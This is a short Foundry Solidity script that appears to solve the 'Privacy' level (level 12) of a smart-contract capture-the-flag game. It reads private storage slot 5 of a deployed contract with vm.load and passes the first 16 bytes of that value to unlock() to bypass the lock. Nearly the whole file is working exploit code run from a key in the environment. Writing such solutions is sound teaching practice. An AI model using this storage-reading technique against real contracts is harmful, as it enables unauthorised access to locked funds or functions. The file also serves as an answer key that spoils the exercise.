// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/12-Privacy.sol";



contract Exploit {

}




contract Exp is Script {

    Privacy public PrivacyInstance = Privacy(payable(0x9a939a7a39BE6b967FAd3DB690bCC8a13B59A9D0));
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    address owner = vm.envAddress("MY_ADDRESS");
    //Exploit public exploit;

    function run() external {
        vm.startBroadcast(hacker);

        bytes32 key = vm.load(address(PrivacyInstance), bytes32(uint256(5)));
        address(PrivacyInstance).call(abi.encodeWithSignature("unlock(bytes16)", bytes16(key)));

        vm.stopBroadcast();
    }
}